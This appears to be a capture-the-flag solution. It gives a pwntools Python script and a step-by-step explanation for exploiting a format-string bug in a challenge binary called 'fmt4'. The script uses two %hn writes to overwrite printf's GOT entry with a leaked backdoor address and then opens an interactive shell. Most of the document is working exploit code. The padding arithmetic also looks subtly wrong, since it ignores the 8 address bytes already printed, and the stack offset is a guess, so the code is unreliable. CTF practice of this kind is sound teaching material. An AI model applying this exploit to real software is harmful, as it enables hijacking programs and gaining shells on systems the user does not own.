**Imports:**

```python
from pwn import *
import re
```

**Code:**

```python
from pwn import *
import re

# Set up pwntools context
context.binary = './fmt4'
binary = context.binary
elf = ELF('./fmt4')

# Start the process
p = process('./fmt4')

# Receive the 'gift' line and extract the address of backdoor
p.recvuntil('gift: ')
line = p.recvline().strip()
# The address is in a string format, possibly with surrounding quotes or formatting
backdoor_addr = int(line.decode('utf-8'), 16)
log.info(f'Backdoor address: {hex(backdoor_addr)}')

# Addresses
printf_got = elf.got['printf']
log.info(f'printf@GOT: {hex(printf_got)}')

# Split the address into two parts for 2-byte writes
addr_low = backdoor_addr & 0xffff
addr_high = (backdoor_addr >> 16) & 0xffff

# Ensure that we handle wrap-around in case addr_high is less than addr_low
if addr_high > addr_low:
    padding1 = addr_low
    padding2 = addr_high - addr_low
else:
    padding1 = addr_low
    padding2 = (addr_high + 0x10000) - addr_low

# Calculate the correct format string offset
# We need to find where our input is located on the stack
# This can vary; common offsets are between 4 and 10
# We'll assume it's 7 for this example, but it may need adjustment
offset = 7

# Build the format string payload
payload = b''
payload += p32(printf_got)
payload += p32(printf_got + 2)
payload += b'%' + str(padding1).encode() + b'c'
payload += b'%' + str(offset).encode() + b'$hn'
payload += b'%' + str(padding2).encode() + b'c'
payload += b'%' + str(offset + 1).encode() + b'$hn'

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
```

**Explanation:**

1. **Receive the Backdoor Address:**
   - The program prints out a "gift" which is the address of the `backdoor` function. We read this address and convert it to an integer for use.

2. **Calculate the Addresses:**
   - We get the address of `printf` in the GOT, which we'll overwrite.
   - We split the `backdoor` address into two 2-byte halves because we'll perform two 2-byte writes using `%hn`.

3. **Prepare the Payload:**
   - We construct a payload that writes the lower 2 bytes of `backdoor` to `printf@GOT` and the upper 2 bytes to `printf@GOT + 2`.
   - We use format string specifiers to write the exact values we need:
     - `%nc` writes `n` characters.
     - `%hn` writes a 2-byte value to the address on the stack.

4. **Calculate Padding:**
   - We calculate the required padding to reach the desired values for each write.
   - If the upper bytes are smaller than the lower bytes, we adjust for the wrap-around by adding `0x10000`.

5. **Determine the Correct Offset:**
   - The offset in the format string (which argument number corresponds to our input) may need adjustment depending on the stack layout. In this example, we used an offset of 7, but you may need to experiment with this value.

6. **Send the Payload and Get a Shell:**
   - We send the payload to the program.
   - We use `p.interactive()` to interact with the shell that we obtain when `backdoor` is executed.

**Note:** Due to variations in stack layout and environment, you may need to adjust the offset value and verify the correctness of the padding in the format string.
